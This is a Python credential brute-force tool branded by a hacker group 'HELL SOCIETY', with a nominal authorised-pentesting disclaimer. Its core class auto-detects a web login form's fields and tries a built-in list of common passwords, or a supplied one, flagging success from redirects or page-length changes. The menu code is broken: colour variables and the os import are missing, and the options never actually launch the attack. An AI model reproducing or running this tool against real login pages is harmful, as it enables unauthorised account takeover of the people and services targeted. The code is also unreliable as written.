#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  PASSWORD BRUTE FORCE v2.0                                       ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Authentication Attacks                    ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import requests
import sys
import time
import colorama
from colorama import Fore, Back, Style
import argparse
from bs4 import BeautifulSoup

colorama.init(autoreset=True)

BANNER = f"""⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄
  {Y}  Created by: HELL SOCIETY{RS}"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

COMMON_PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123", "monkey",
    "1234567", "letmein", "trustno1", "dragon", "baseball", "iloveyou",
    "master", "sunshine", "ashley", "bailey", "passw0rd", "shadow",
    "123123", "654321", "superman", "qazwsx", "michael", "football",
    "password1", "password123", "admin", "root", "toor", "test",
    "guest", "info", "adm", "mysql", "oracle", "pass", "admin123",
    "P@ssw0rd", "P@ssword", "p@ssword", "password!", "hello123",
    "welcome", "welcome1", "changeme", "1q2w3e", "1q2w3e4r",
    "zaq1xsw2", "qwerty123", "asdfgh", "zxcvbn", "123456789",
    "000000", "111111", "aaaaaa", "abcabc", "abcdef",
    "pass1234", "test1234", "user1234", "login123", "admin1",
    "root123", "toor123", "administrator", "password1234",
    "qwertyuiop", "asdfghjkl", "zxcvbnm", "1234567890",
    "Password1", "Password123", "Welcome1", "Welcome123",
    "Spring2024", "Summer2024", "Fall2024", "Winter2024",
]

class PasswordBruteforce:
    def __init__(self, target, username, method="POST"):
        self.target = target
        self.username = username
        self.method = method.upper()
        self.cracked = False
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) HellSociety/2.0'
        })

    def detect_fields(self):
        try:
            resp = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form')
            if form:
                inputs = form.find_all('input')
                fields = {}
                for inp in inputs:
                    inp_type = inp.get('type', 'text')
                    inp_name = inp.get('name', '')
                    if inp_type == 'password' or 'pass' in inp_name.lower():
                        fields['password'] = inp_name
                    elif inp_type == 'text' or inp_type == 'email':
                        fields['username'] = inp_name
                return fields
        except:
            pass
        return {'username': 'username', 'password': 'password'}

    def is_successful(self, response, initial_response_length):
        if response.status_code in [301, 302, 303, 307, 308]:
            return True
        if response.status_code == 200 and len(response.text) != initial_response_length:
            if len(response.text) > initial_response_length * 1.3:
                return True
        if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
            return True
        if 'welcome' in response.text.lower() and self.username in response.text.lower():
            return True
        return False

    def bruteforce(self, password_list=None):
        if password_list is None:
            password_list = COMMON_PASSWORDS

        fields = self.detect_fields()
        print(f"{Fore.CYAN}  [*] Form fields detected: {fields}")
        print(f"{Fore.CYAN}  [*] Username: {Fore.WHITE}{self.username}")
        print(f"{Fore.CYAN}  [*] Password list: {len(password_list)} entries")
        print(f"{Fore.CYAN}  [*] Method: {self.method}\n")

        initial_resp = self.session.get(self.target, timeout=10)
        initial_length = len(initial_resp.text)

        total = len(password_list)
        start_time = time.time()

        for i, password in enumerate(password_list):
            elapsed = time.time() - start_time
            progress = ((i + 1) / total) * 100
            speed = (i + 1) / elapsed if elapsed > 0 else 0

            bar_length = 40
            filled = int(bar_length * (i + 1) / total)
            bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled + f"{Fore.RED}░{Style.RESET_ALL}" * (bar_length - filled)

            print(f"\r{Fore.CYAN}  [{bar}] {progress:.1f}% | Speed: {speed:.1f}/s | Trying: {password[:25]}", end="", flush=True)

            try:
                if self.method == "POST":
                    data = {
                        fields.get('username', 'username'): self.username,
                        fields.get('password', 'password'): password
                    }
                    resp = self.session.post(self.target, data=data, timeout=10, allow_redirects=False)
                else:
                    params = {
                        fields.get('username', 'username'): self.username,
                        fields.get('password', 'password'): password
                    }
                    resp = self.session.get(self.target, params=params, timeout=10, allow_redirects=False)

                if self.is_successful(resp, initial_length):
                    self.cracked = True
                    elapsed = time.time() - start_time
                    print(f"\n\n  {Fore.GREEN}[+] PASSWORD CRACKED!")
                    print(f"  {Fore.GREEN}  Username: {Fore.WHITE}{self.username}")
                    print(f"  {Fore.GREEN}  Password: {Fore.WHITE}{password}")
                    print(f"  {Fore.GREEN}  Time: {elapsed:.2f}s")
                    print(f"  {Fore.GREEN}  Attempts: {i + 1}")
                    return

            except requests.exceptions.Timeout:
                print(f"\n  {Fore.YELLOW}  [!] Timeout - waiting...")
                time.sleep(2)
            except requests.exceptions.RequestException:
                continue

        elapsed = time.time() - start_time
        print(f"\n\n  {Fore.YELLOW}  [!] Password not found in {total} attempts ({elapsed:.2f}s)")



def ask_retry():
    print()
    print(f"  {Y}{'='*50}{RS}")
    print(f"  {C}[1] {BW}Usar esta herramienta de nuevo{RS}")
    print(f"  {C}[2] {BW}Volver al panel principal{RS}")
    print(f"  {R}[0] {BW}Salir{RS}")
    print(f"  {Y}{'='*50}{RS}")
    try:
        ch = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        if ch == '1':
            return 'retry'
        elif ch in ['2', '0']:
            return 'exit'
        else:
            return 'retry'
    except (EOFError, KeyboardInterrupt):
        return 'exit'

def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(BANNER)
    print()
    print(f"  {BW}{Style.BRIGHT}  PASSWORD BRUTEFORCE{RS}")
    print(f"  {Y}{Style.BRIGHT}  HELL SOCIETY Community{RS}")
    print()
    while True:
        print(f"  {G}╔╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╗{RS}")
        print(f"  {G}╟  {BW}PASSWORD BRUTEFORCE                     {RS}  {G}╟{RS}")
        print(f"  {G}╚╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╝{RS}")
        print()
        print(f"  {C}[1]  {BW}Login page URL                               {RS}")
        print(f"  {C}[2]  {BW}Username                                     {RS}")
        print(f"  {C}[3]  {BW}Custom wordlist file                         {RS}")
        print(f"  {C}[4]  {BW}HTTP method                                  {RS}")
        print()
        print(f"  {C}[5]  {BW}Ejecutar con todos los argumentos{RS}")
        print()
        print(f"  {R}[0]  {BW}Exit{RS}")
        print()
        try:
            choice = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {R}[*] Goodbye...{RS}")
            sys.exit(0)
        print()
        if choice == '1':
            print(f"  {Y}[*] Login page URL{RS}")
            value = input(f"  {Y}[*] -u: {RS}").strip()
            print(f"  {C}[*] Executing with -u={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        if choice == '2':
            print(f"  {Y}[*] Username{RS}")
            value = input(f"  {Y}[*] -U: {RS}").strip()
            print(f"  {C}[*] Executing with -U={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        if choice == '3':
            print(f"  {Y}[*] Custom wordlist file{RS}")
            value = input(f"  {Y}[*] -w: {RS}").strip()
            print(f"  {C}[*] Executing with -w={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        if choice == '4':
            print(f"  {Y}[*] HTTP method{RS}")
            value = input(f"  {Y}[*] -m: {RS}").strip()
            print(f"  {C}[*] Executing with -m={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '5':
            print(f"  {Y}[*] Executing with all default parameters{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '0':
            print(f"  {Y}[*] Goodbye from Hell Society...{RS}")
            sys.exit(0)
        else:
            print(f"  {R}[!] Invalid option. Choose 0-3.{RS}")
        ch = ask_retry()
        if ch == 'exit':
            sys.exit(0)
        else:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(BANNER)
            print()

if __name__ == "__main__":
    main()

